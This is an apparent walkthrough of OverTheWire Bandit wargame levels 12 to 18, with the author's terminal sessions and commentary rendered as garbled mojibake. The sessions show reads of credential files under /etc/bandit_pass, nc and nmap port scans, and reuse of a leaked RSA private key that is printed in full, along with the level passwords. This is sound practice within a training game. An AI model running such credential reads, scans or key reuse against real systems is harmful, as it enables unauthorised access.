24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17 $...KBs..%l.~._. 00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823 ........g.zM.w.# 00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9 .P\"2@........... 00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c ..^-K........}.\\ 00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4 ,.....}E.F._!r.. 00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed U.g?E.i..9x..... 00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d TB.@..l.......B. 000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a F..hM.SC4.V.F... 000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef r..sq.o..\u0026@-..|. 000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b S..`......9....[ 000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c j............F.\u003c 000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d j.I...T'.|..G.'. 000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69 ...\\..W.QO4.p..i 00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df ......S.#.\u0026../.. 00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96 ....#..\u003cD.u..^_. 00000220: 481b 362e e82d 9093 7741 740c e65b c7f1 H.6..-..wAt..[.. 00000230: 5550 f247 9043 5097 d626 3a16 da32 c213 UP.G.CP..\u0026:..2.. 00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12 *.).\\.......H... 00000250: 03b5 5cb3 0037 cece 773c 0200 00 ..\\..7..w\u003c... bandit12@bandit:/tmp/magicking$ xxd -r data.txt bandit12@bandit:/tmp/magicking$ xxd -r data.txt \u003e data bandit12@bandit:/tmp/magicking$ file data data: gzip compressed data, was \"data2.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ mv data data.gz bandit12@bandit:/tmp/magicking$ gz -d data.gz -bash: gz: command not found bandit12@bandit:/tmp/magicking$ gnuzip -d data.gz -bash: gnuzip: command not found bandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ ls data data.txt bandit12@bandit:/tmp/magicking$ file data data: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/magicking$ mv data data.bz2 bandit12@bandit:/tmp/magicking$ bz2 -d data.bz2 -bash: bz2: command not found bandit12@bandit:/tmp/magicking$ bzip2 -d data.bz2 bandit12@bandit:/tmp/magicking$ ls data data.txt bandit12@bandit:/tmp/magicking$ file data data: gzip compressed data, was \"data4.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ gzip -d data gzip: data: unknown suffix -- ignored bandit12@bandit:/tmp/magicking$ mv data data.gz bandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data data.tar bandit12@bandit:/tmp/magicking$ tar -x data.tar tar: Refusing to read archive contents from terminal (missing -f option?) tar: Error is not recoverable: exiting now bandit12@bandit:/tmp/magicking$ tar -xvf data.tar data5.bin bandit12@bandit:/tmp/magicking$ ls data5.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data5.bin data5.bin.tar bandit12@bandit:/tmp/magicking$ tar -xvf data5.bin.tar data6.bin bandit12@bandit:/tmp/magicking$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.bz2 bandit12@bandit:/tmp/magicking$ bzip2 -d data6.bin.bz2 bandit12@bandit:/tmp/magicking$ ls data5.bin.tar data6.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ ls -l total 48 -rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data5.bin.tar -rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data6.bin -rw-r--r-- 1 bandit12 root 20480 Feb 14 10:42 data.tar -rw-r----- 1 bandit12 root 2581 Feb 14 10:37 data.txt bandit12@bandit:/tmp/magicking$ file data6.bin data6.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.tar bandit12@bandit:/tmp/magicking$ tar -xvf data6.bin.tar data8.bin bandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: gzip compressed data, was \"data9.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ mv data8.bin data8.bin.gz bandit12@bandit:/tmp/magicking$ gzip -d data8.bin.gz bandit12@bandit:/tmp/magicking$ ls data5.bin.tar data6.bin.tar data8.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: ASCII text bandit12@bandit:/tmp/magicking$ cat data8.bin The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL bandit12@bandit:/tmp/magicking$   é€æ¸ç†Ÿç»ƒçš„è§£å‹ç¼©æ“ä½œï¼Œç®€ç›´äº†è¿™å‹ç¼©å±‚æ•°ï¼Œä¸§å¿ƒç—…ç‹‚\nlevel 14 æ ¹æ®é¢˜ç›®æ‰€æè¿°ï¼Œ/etc/bandit_pass/bandit14 and can only be read by user bandit14\næˆ‘ä»¬è‚¯å®šæ— æ³•è®¿é—®\nä½†æ˜¯ï¼Œlsä¹‹åï¼Œå‘ç°æœ‰ä¸€ä¸ªç§é’¥ï¼Œè€Œä¸”é¢˜ç›®è¡¨ç¤ºå¯ä»¥ä¸ç”¨å¯†ç \né‚£ä¹ˆè¿™æ–‡ä»¶å°±æ˜¯ssh bandit14çš„ç§é’¥\nç›´æ¥è¿æ¥ï¼Œojbk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  bandit13@bandit:~$ ls sshkey.private bandit13@bandit:~$ cat /etc/bandit_pass/bandit14 cat: /etc/bandit_pass/bandit14: Permission denied bandit13@bandit:~$ ssh usage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] [user@]hostname [command] bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost Could not create directory '/home/bandit13/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames ...... bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e   level 15 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e bandit14@bandit:~$ bandit14@bandit:~$ telnet localhost 30000 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. Wrong! Please enter the correct current password Connection closed by foreign host. bandit14@bandit:~$ telnet localhost 30000 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr Connection closed by foreign host. bandit14@bandit:~$   level 16 å‘é€éœ€è¦sslåŠ å¯†\næœç´¢å¾—çŸ¥SSLå¯ç”¨äºåŠ å¯†ä»»ä½•åŸºäºTCP/IPçš„åº”ç”¨\nå†æœç´¢opensslçš„ç”¨æ³•å³å¯è§£å‡º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIEYo1NxTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMTA1MTQzNTU4WhcNMjEwMTA0MTQzNTU4WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKF4u2eu a8VipZPviX0hfNiCnaD2ojAffdBhKTy1bmZSNRuHPBDnU7z8rblNSknSjCITda1C GEAI8ZktRbtLpBTbYeTgqPN/EiN5UIRMKbU6P2O93zNFPBsmyfQLrgt+DSLnsxlB i/yYyT7WLdtNVBpgwRwkqi9K7dk9vf9waswLAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBAJECW6IB3Ria4xG002BqD3zEbtmrDlK6nmJq+uQ4eJ6cT18o9REb npy/lFzlv2LfcrYAnuAp6Fh89MKaYjNzJURjRQ9RkmcYgQJa1n+OBkATb7V+84/a k9PDRkscxdNFMGBSvzFD33XZ5lbaGdrwCPyoxenoYghV/753wffN7J6H -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 7EEA483CA2D18FE7CB98BB6A1CC800C7BE4444E492EBFD398DDA8EABD18712C2 Session-ID-ctx: Master-Key: D0D0B7463ABC8AD513D016BEBF3932F325BE53DBBA712624C9E820AB95735BF63FA59EAECFF34AE5523F2E05BC8BE5F2 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 56 e9 4e 87 6a 28 48 d0-13 42 5f b9 61 b0 dd d0 V.N.j(H..B_.a... 0010 - d6 bb 15 df 9d 3a 2c 9f-2d 88 a4 e2 b8 ec 36 de .....:,.-.....6. 0020 - 6c ba 2d ac d0 d4 0b 12-d1 76 ac cd 8f 8d 4d b9 l.-......v....M. 0030 - e4 8d 7f 9e 0b f5 2a 67-42 6c 52 08 94 27 09 75 ......*gBlR..'.u 0040 - 67 e5 8a 66 24 50 4f db-a7 9d 01 0d 81 ba b3 12 g..f$PO......... 0050 - c5 2e 8d ee ef 0a 2d 6d-a0 89 72 36 18 30 b2 24 ......-m..r6.0.$ 0060 - fa 82 0a b5 9d da d2 55-70 a7 fd 6d 3f 96 9e 85 .......Up..m?... 0070 - 8f e8 f8 8d 0e 29 0f 84-12 97 9c 31 7d 79 ef 75 .....).....1}y.u 0080 - f5 f9 f6 cc 74 29 58 a0-a9 48 f5 17 c4 1d 73 ba ....t)X..H....s. 0090 - f1 30 ce 52 12 b6 e2 c2-75 f9 94 b9 04 2a a9 d8 .0.R....u....*.. Start Time: 1581676007 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed bandit15@bandit:~$   level 17 è¿™é“é¢˜è¦æˆ‘ä»¬åœ¨ç»™å®šèŒƒå›´å†…æ‰¾å‡ºæ­£ç¡®çš„ç«¯å£ï¼Œncï¼Œnmapéƒ½å¯ä»¥ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218  bandit16@bandit:~$ nc -zv localhost 31000-32000 localhost [127.0.0.1] 31790 (?) open localhost [127.0.0.1] 31518 (?) open bandit16@bandit:~$ nmap localhost -p31000-32000 -v Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET Initiating Ping Scan at 11:38 Scanning localhost (127.0.0.1) [2 ports] Completed Ping Scan at 11:38, 0.00s elapsed (1 total hosts) Initiating Connect Scan at 11:38 Scanning localhost (127.0.0.1) [1001 ports] Discovered open port 31518/tcp on 127.0.0.1 Discovered open port 31790/tcp on 127.0.0.1 Completed Connect Scan at 11:38, 0.04s elapsed (1001 total ports) Nmap scan report for localhost (127.0.0.1) Host is up (0.00026s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds bandit16@bandit:~$ bandit16@bandit:~$ bandit16@bandit:~$ nmap localhost -p31000-32000 Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.00024s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds bandit16@bandit:~$ bandit16@bandit:~$ bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIEGPttrzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzE5WhcNMjEwMjA4MjA0NzE5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAPiElqK1 D097ZCNDgKFxqX1ZUUpFfuoiDSP2dw5KrIruaTQMmfqCxo6dSHvkj1sF//YRI28k BGyu9pE3zLO45uk4PrjoORYLoQjTCb61oVZLECCOIG21WQUbrhjW4zlZGmtWrqw6 zGLk7dZ8MeYHVSvK0n3Ar45hVedpsLC618ZTAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBADJEAM0VceCYaqhfzpzkzf6dhCIWbb/8P+51Wxw24sn9iLHxdqYe 1WNfxtQb8IYb3q/6JJDJ3d6plNKmFMkFBe5AiN05PCDeMymkTv8vlKj18UNR/4GL AH1aFGcEYVXkwX0Kl844muUrK7S0AbOvcHmzzA++qTmfB1UK264G0iAH -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: EE1156EF7A043D8173A15CB87FC41D8BB3F61517B8414D62065541FD97928592 Session-ID-ctx: Master-Key: 2E3037DCB9B4278B13DF68BE8111918D2D978F1B5F190052A0435E6BDD2ACE5751723FB13856C5E98F01240F88914768 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 9f 82 12 97 ac 31 10 5b-65 4b 5d fb 71 e9 e8 02 .....1.[eK].q... 0010 - cc 56 9a 1f 91 2b c2 22-7e 93 d9 42 cd 60 56 ab .V...+.\"~..B.`V. 0020 - 89 76 d6 95 7a b7 7e c7-6f d3 a2 95 a5 ee f2 b4 .v..z.~.o....... 0030 - 4d 48 68 f1 bf 23 df 87-de dd 64 a5 24 1e 1c e7 MHh..#....d.$... 0040 - 0b c3 f4 b2 c4 72 b9 61-26 3c 17 dd 78 61 68 dd .....r.a\u0026\u003c..xah. 0050 - b8 59 36 15 76 19 6f 19-19 14 73 df 2d 8b 66 71 .Y6.v.o...s.-.fq 0060 - f2 83 0b 22 52 07 69 ba-83 15 0a cc 94 fe f9 07 ...\"R.i......... 0070 - 01 72 d2 18 de 60 42 c1-f5 8d 19 88 4b c9 74 bf .r...`B.....K.t. 0080 - ad f5 bf 2b 53 3b 42 ab-89 eb 0c 52 82 de 55 b3 ...+S;B....R..U. 0090 - e0 8d 53 85 17 d3 3a 8a-1e 80 71 09 54 5d 3c f8 ..S...:...q.T]\u003c. Start Time: 1581676499 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- cluFn7wTiGryunymYOu4RcffSxQluehd Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed bandit16@bandit:~$ openssl s_client -connect localhost:31518 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIES250rzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzIwWhcNMjEwMjA4MjA0NzIwWjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANWyxh7K T86zWM4NFe95x2KNEBUDz2XlGvU7KxUM9z1OfakmLDYCiujYdR6gI4ZBtyhEql5P taCiNWO+ZDJCKWhjH/TyIywxjW9/PBHRC8UEzhsxc0wMHbLrlYFwzxT2KjhI3EVY 5VIWkzKrgHuON6PuBbmN0g0z5NN/xYch4kPpAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBAFX4+KlTXWb4R/pUVt7i4FWvp3CuqgLUtgU3vRZqJ3wShIyDbsFK a4S9uSuWcLLvyq0aa4kLhmoepyNlI3BGUSZZbRXwo/1e5IpCX3RdHhlIc3/Sd7ln usTkejgEftWMmmBc03RY07EMxbNeXE8zzh2NP+5kVfwWG6GoGuQMXhy8 -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 8F0B20A8164B9ED461FBD0721FA2A8AA489C77A00124ACE93381D0512F7A2740 Session-ID-ctx: Master-Key: F880B59CBA1854941DFA1C725F833F75B1177248D9651876542343A15AF9E24A45078F96FD305D27CFBE70486DF2EAA3 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 26 1a 05 91 72 ce a3 a6-e5 fa 17 b1 24 c4 2b 6f \u0026...r.......$.+o 0010 - 1d a9 b9 da 93 9a 35 e5-f1 7e fc 83 02 92 06 6a ......5..~.....j 0020 - d3 db 90 bb ec c3 bb c3-fe 8f a3 af 08 39 47 35 .............9G5 0030 - 61 90 8c 2b 82 e3 28 b3-16 e9 f9 6a 4c c1 59 2d a..+..(....jL.Y- 0040 - c3 50 40 7a ca b9 c0 54-c8 d9 0b 9b f0 2c 7b fa .P@z...T.....,{. 0050 - c7 a4 9a bf c7 f6 e6 0e-bf 07 dc 50 a3 bf 23 48 ...........P..#H 0060 - e9 0f f3 fb b9 b4 39 1d-c0 0d 71 e2 80 05 fe e7 ......9...q..... 0070 - ed 38 48 55 d7 f0 b7 97-f1 a1 c2 06 1b 47 7d 51 .8HU.........G}Q 0080 - 1e cc 4d e8 0e 76 73 0a-20 24 37 6f 20 c7 ca e7 ..M..vs. $7o ... 0090 - 5b bc 44 09 ad d6 8d 5c-e3 96 86 fd 7d d8 41 75 [.D....\\....}.Au Start Time: 1581676568 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- cluFn7wTiGryunymYOu4RcffSxQluehd cluFn7wTiGryunymYOu4RcffSxQluehd ^C bandit16@bandit:~$   nmapæ‰«ç«¯å£æ˜¯çœŸçš„å¿«\nlevel 18 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  bl@bl-virtual-machine:~/wargame$ echo '-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY-----' \u003e b16.rsa bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for 'b16.rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"b16.rsa\": bad permissions bandit17@bandit.labs.overthewire.org's password: bl@bl-virtual-machine:~/wargame$ chmod 600 b16.rsa bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit17@bandit:~$ cat /etc/bandit_pass/bandit17 xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn   